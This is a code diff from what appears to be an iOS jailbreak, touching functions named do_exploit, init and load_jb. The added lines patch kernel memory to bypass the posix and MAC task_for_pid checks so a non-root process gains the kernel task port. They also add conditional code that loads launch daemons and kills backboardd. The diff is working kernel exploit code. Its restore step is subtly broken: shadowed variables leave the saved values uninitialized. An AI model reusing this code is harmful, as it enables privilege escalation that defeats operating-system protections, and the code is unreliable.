@@ -239,6 +239,8 @@ void offsets_init(void){
 }
 
 void init(void){
+    
+#ifdef UNTETHER
     int fd;
     fd = open(CONSOLE,NEWFILE,0644);
     if(fd<0){
@@ -255,6 +257,8 @@ void init(void){
     close(fd);
     
     printf("\n");
+#endif
+    
 }
 
 void initialize(void) {
@@ -645,12 +649,34 @@ void do_exploit(uint32_t kernel_base){
     patch_page_table(1, tte_virt, tte_phys, flush_dcache, invalidate_tlb, pid_check_addr & ~0xFFF);
     write_primitive(pid_check_addr, pid_check_val); // cmp r6, #ff
     
+    uint32_t posix_check_ret_addr;
+    uint32_t posix_check_ret_val;
+    uint32_t mac_proc_check_ret_addr;
+    uint32_t mac_proc_check_ret_val;
+    if(uid != 0){
+        uint32_t posix_check_ret_addr = koffset(offsetof_posix_check) + task_for_pid_base;
+        uint32_t posix_check_ret_val = read_primitive(posix_check_ret_addr);
+        patch_page_table(1, tte_virt, tte_phys, flush_dcache, invalidate_tlb, posix_check_ret_addr & ~0xFFF);
+        write_primitive(posix_check_ret_addr, posix_check_ret_val + 0xff); // cmp r0, #ff
+        
+        uint32_t mac_proc_check_ret_addr = koffset(offsetof_mac_proc_check) + task_for_pid_base;
+        uint32_t mac_proc_check_ret_val = read_primitive(mac_proc_check_ret_addr);
+        patch_page_table(1, tte_virt, tte_phys, flush_dcache, invalidate_tlb, mac_proc_check_ret_addr & ~0xFFF);
+        write_primitive(mac_proc_check_ret_addr, mac_proc_check_ret_val | 0x10000); // cmp.w r8, #1
+    }
+    
     exec_primitive(flush_dcache, 0, 0);
     
     usleep(100000);
     
     task_for_pid(mach_task_self(), 0, &kernel_task);
     tfp0 = kernel_task;
+    
+    if(uid != 0){
+        write_primitive_dword_tfp0(posix_check_ret_addr, posix_check_ret_val);
+        write_primitive_dword_tfp0(mac_proc_check_ret_addr, mac_proc_check_ret_val);
+        exec_primitive(flush_dcache, 0, 0);
+    }
     
 }
 
@@ -923,14 +949,18 @@ void load_jb(){
     
     jl = "/bin/launchctl";
     posix_spawn(&pd, jl, NULL, NULL, (char **)&(const char*[]){ jl, "load", "/Library/LaunchDaemons", NULL }, NULL);
-    //waitpid(pd, NULL, 0);
     
+#ifdef UNTETHER
     posix_spawn(&pd, jl, NULL, NULL, (char **)&(const char*[]){ jl, "load", "/Library/NanoLaunchDaemons", NULL }, NULL);
-    //waitpid(pd, NULL, 0);
     
     jl = "/usr/libexec/CrashHousekeeping_o";
     posix_spawn(&pd, jl, NULL, NULL, (char **)&(const char*[]){ jl, NULL }, NULL);
-    //waitpid(pd, NULL, 0);
+#endif
+    
+#ifdef RELOADER
+    jl = "/usr/bin/killall";
+    posix_spawn(&pd, jl, NULL, NULL, (char **)&(const char*[]){ jl, "-9", "backboardd", NULL }, NULL);
+#endif
     
 }
 
